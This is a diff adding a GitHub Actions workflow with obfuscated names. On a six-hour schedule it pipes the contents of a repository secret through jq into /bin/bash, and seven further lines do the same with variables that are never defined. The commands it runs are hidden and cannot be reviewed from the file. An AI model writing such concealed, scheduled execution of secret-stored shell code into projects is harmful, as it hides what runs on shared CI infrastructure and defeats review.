@@ -1,0 +1,26 @@
+name: kanlaizaisheng
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: kanlaizaisheng
+        env:
+          bs12: ${{ secrets.bs12 }}
+        run: |
+          echo $bs12 | jq -r .dsns95358 | /bin/bash
+          echo $q3 | jq -r .mmm439 | /bin/bash
+          echo $ci05 | jq -r .xc35 | /bin/bash
+          echo $pmujj8 | jq -r .qne6 | /bin/bash
+          echo $k0 | jq -r .npj4256 | /bin/bash
+          echo $o93488 | jq -r .s5 | /bin/bash
+          echo $ktar18 | jq -r .v8 | /bin/bash
+          echo $vi17 | jq -r .xvl91278 | /bin/bash
+
